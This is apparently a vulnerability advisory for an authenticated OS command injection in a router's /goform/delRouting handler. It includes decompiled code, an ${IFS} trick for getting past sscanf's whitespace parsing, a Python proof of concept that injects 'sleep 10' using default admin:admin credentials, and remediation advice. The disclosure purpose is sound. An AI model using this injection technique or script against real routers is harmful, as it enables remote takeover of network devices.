### 1. Vulnerability Summary

* **Vulnerability Type:** OS Command Injection (CWE-78)
* **Affected Component:** Router Web Management Interface (GoAhead Web Server)
* **Affected Endpoint:** `/goform/delRouting` (handled by `sub_421980` and `sub_420234`)
* **Vulnerable Parameter:** `DR%d` (e.g., `DR0`, `DR1`, etc.)
* **Prerequisite:** Authentication Required

### 2. Detailed Vulnerability Description

A critical OS Command Injection vulnerability exists in the routing deletion functionality of the device's web management interface. The vulnerability occurs because user-supplied input from HTTP POST parameters is insecurely concatenated into a system command string without proper sanitization or neutralization of special elements.

The exploitation chain is as follows:

**Step 1: Unsafe Data Extraction (`sub_421980`)**

When a request is sent to `/goform/delRouting`, the handler dynamically extracts variables named `DR0`, `DR1`, etc., using `websGetVar`.

**C**

```
snprintf(v15, 16, "DR%d", v9);
Var = websGetVar(a1, v15, 0);
```

**Step 2: Flawed Parsing Mechanism**

The program checks if the input length is less than 257 (`< 0x101`). It then uses `sscanf` to parse the input into three separate buffers (`v12`, `v13`, `v14`):

**C**

```
if ( (unsigned int)strlen(Var) < 0x101 )
{
  sscanf(Var, "%s%s%s", v12, v13, v14);
  sub_420234(v12, v13, v14);
  // ...
}
```

While `sscanf("%s")` splits the string at whitespace characters (spaces, tabs), attackers can bypass this restriction by using the Internal Field Separator (`${IFS}`) variable in Linux to construct continuous malicious strings that expand into spaced commands upon execution.

**Step 3: Unsafe Command Assembly and Execution (`sub_420234` / Taint Sink)**

The parsed variables are passed to `sub_420234`, where they are directly concatenated into a local buffer `v9` using `strcat` and `sprintf` to build a `route del` command:

**C**

```
strcpy(v9, "route del ");
// ...
strcat(v9, a1); 
// ...
sprintf(v9, "%s netmask %s", v9, a2);
sprintf(v9, "%s dev %s ", v9, a3);
return doSystem(v9);
```

The resulting string is passed to `doSystem()`, which executes it in the underlying OS shell. By injecting shell metacharacters (such as `;`), an attacker can terminate the `route del` command and append arbitrary OS commands.

### 3. Impact Analysis

* **Remote Code Execution (RCE):** An authenticated attacker can execute arbitrary system commands on the underlying operating system.
* **System Compromise:** Since the web server typically runs with high privileges (often `root` in embedded Linux environments), successful exploitation leads to total control over the router. The attacker can modify configurations, intercept network traffic, or pivot into the internal network.

### 4. Proof of Concept (PoC)

The following Python script demonstrates how to exploit this vulnerability using Time-based Blind Injection. It uses `${IFS}` to bypass the `sscanf` whitespace limitation and executes the `sleep 10` command on the device.

**Python**

```
import requests
import time

# Target router IP address
router_ip = "192.168.0.1" 
url = f"http://{router_ip}/goform/delRouting" 

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Authorization": "Basic YWRtaW46YWRtaW4="  # admin:admin in Base64
}

# The payload uses ${IFS} to bypass the sscanf whitespace limitation.
# Format requires 3 strings separated by space to satisfy sscanf("%s%s%s").
# Injection happens in the first string.
malicious_a1 = "1.1.1.1;sleep${IFS}10;"

dummy_a2 = "255.255.255.0"
dummy_a3 = "LAN"

payload = {
    "DR0": f"{malicious_a1} {dummy_a2} {dummy_a3}"
}

print("[*] Preparing to send Command Injection payload...")
print(f"[*] Target URL: {url}")
print(f"[*] Injected payload into 'DR0': {payload['DR0']}")

try:
    start_time = time.time()
  
    # Send POST request with a timeout to catch the sleep delay
    response = requests.post(url, data=payload, headers=headers, timeout=15)
  
    elapsed_time = time.time() - start_time
  
    print(f"[*] HTTP Status Code: {response.status_code}")
    print(f"[*] Total request time: {elapsed_time:.2f} seconds")
  
    # Verification logic
    if elapsed_time >= 10:
        print("\n[+] Trigger Successful! (Vulnerable to Command Injection)")
        print("[+] The system executed the injected `sleep 10` command!")
    else:
        print("\n[-] The response was fast. The injection may have failed.")
        print("[-] Possible reason: The endpoint URL is incorrect or the firmware has patched this.")

except requests.exceptions.ReadTimeout:
    print("\n[+] Trigger Successful! (Timeout)")
    print("[+] The request timed out, confirming the `sleep 10` command blocked the server thread.")
except Exception as e:
    print(f"\n[-] An unexpected exception occurred: {e}")
```

### 5. Remediation Recommendations

1. **Parameterize System Calls:** Avoid using `system()` or `popen()`. Instead of executing OS commands via a shell, use library functions like `execve` where arguments are passed as an array, preventing shell metacharacter interpretation.
2. **Direct API Usage:** For modifying routing tables, utilize the native Linux Netlink API (via sockets) rather than invoking the `route` binary.
3. **Strict Input Validation:** If executing binaries is absolutely necessary, implement strict allow-list validation on the extracted parameters (e.g., validate that `a1` and `a2` strictly conform to IPv4 address patterns and do not contain characters like `;`, `|`, `$`, or `&`).
